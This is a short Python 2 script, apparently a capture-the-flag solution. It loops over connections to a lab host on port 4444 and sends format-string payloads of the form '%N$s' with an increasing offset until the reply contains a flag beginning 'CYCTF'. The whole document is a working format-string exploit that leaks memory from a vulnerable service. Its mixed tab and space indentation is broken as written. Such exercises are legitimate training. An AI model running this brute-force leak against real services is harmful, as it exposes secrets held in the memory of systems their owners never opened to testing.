from socket import *

i = 0
while(True):
	print "Attempt "+str(i+1)
	s = socket(AF_INET, SOCK_STREAM)
  	# open a connection
  	s.connect(('192.168.125.115', 4444))
  	# recive any data from the connection
  	s.recv(1000)
	# send our data
  	s.send('%'+str(i)+'$s\n')
	# recive the response from the connection
	data = s.recv(1000)  
  	
	# check if the flag is in the data that we recive
  	if "CYCTF" in data:
   		print "find the flag"
   		print i,data
		# close the connection 
   		s.close()
		# exit from the loop
   		break
	# close the connection and try again
 	s.close()
	i = i+1
  


